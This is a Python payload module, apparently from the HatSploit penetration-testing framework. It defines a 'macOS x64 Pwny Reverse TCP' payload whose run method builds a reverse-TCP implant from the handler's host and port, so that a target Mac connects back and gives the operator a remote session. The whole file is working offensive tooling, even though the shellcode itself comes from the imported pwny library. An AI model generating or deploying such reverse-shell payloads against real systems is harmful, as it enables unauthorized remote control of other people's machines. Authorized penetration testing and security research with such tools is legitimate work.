#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "macOS x64 Pwny Reverse TCP",
            'Payload': "macos/x64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "macOS x64 Pwny Reverse TCP",
            'Architecture': "x64",
            'Platform': "macos",
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp"
        }

    def run(self):
        return self.get_pwny(
            self.details['Platform'],
            self.details['Architecture'],
            {
                'host': self.handler['RHOST'],
                'port': self.handler['RPORT'],
                'type': self.details['Type']
            }
        )
